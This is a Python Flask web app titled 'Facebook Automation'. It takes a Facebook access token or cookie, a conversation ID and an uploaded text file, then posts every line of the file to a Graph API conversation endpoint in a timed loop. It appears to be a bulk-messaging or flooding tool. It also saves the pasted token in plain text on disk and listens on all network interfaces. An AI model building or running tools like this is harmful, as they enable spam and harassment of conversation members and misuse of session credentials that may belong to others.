from flask import Flask, request, redirect, url_for, render_template_string
import os
import time
import requests

app = Flask(__name__)

# Static headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
}

# Render form on the main route
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Get form data
        token_cookie = request.form.get('token')
        conversation_id = request.form.get('conversation_id')
        delay = int(request.form.get('delay', 10))

        # Read TXT files for messages and configurations
        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        folder_name = f"Convo_{conversation_id}"
        os.makedirs(folder_name, exist_ok=True)

        # Save token/cookie and messages in the folder
        with open(os.path.join(folder_name, "token_cookie.txt"), "w") as f:
            f.write(token_cookie)

        with open(os.path.join(folder_name, "messages.txt"), "w") as f:
            f.write("\n".join(messages))

        # API URL construction (example based on provided cookie/token logic)
        post_url = f"https://graph.facebook.com/v15.0/t_{conversation_id}/"

        # Sending messages loop
        for idx, message in enumerate(messages):
            try:
                # Example token/cookie authentication
                params = {
                    'access_token': token_cookie,  # Use the provided cookie/token
                    'message': message,
                }
                response = requests.post(post_url, params=params, headers=headers)
                
                # Log success or failure
                if response.ok:
                    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Message {idx + 1}: Sent successfully!")
                else:
                    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Message {idx + 1}: Failed to send!")
            except Exception as e:
                print(f"Error sending message {idx + 1}: {e}")

            # Delay between messages
            time.sleep(delay)

        return "Messages Sent Successfully!"

    # HTML template for the form
    html_template = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Facebook Automation</title>
    </head>
    <body style="font-family: Arial, sans-serif; background-color: #f4f4f4; padding: 20px;">
        <h1>Facebook Automation</h1>
        <form action="/" method="post" enctype="multipart/form-data">
            <label for="token">Enter Token/Cookie:</label>
            <input type="text" name="token" id="token" required style="width: 100%; margin-bottom: 10px;"><br>
            <label for="conversation_id">Enter Conversation ID:</label>
            <input type="text" name="conversation_id" id="conversation_id" required style="width: 100%; margin-bottom: 10px;"><br>
            <label for="txtFile">Upload Messages File (TXT):</label>
            <input type="file" name="txtFile" id="txtFile" accept=".txt" required style="margin-bottom: 10px;"><br>
            <label for="delay">Delay (seconds):</label>
            <input type="number" name="delay" id="delay" value="10" required style="width: 100%; margin-bottom: 10px;"><br>
            <button type="submit" style="padding: 10px 20px; background-color: #28a745; color: white; border: none; cursor: pointer;">Submit</button>
        </form>
    </body>
    </html>
    '''
    return render_template_string(html_template)

# Run the application
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
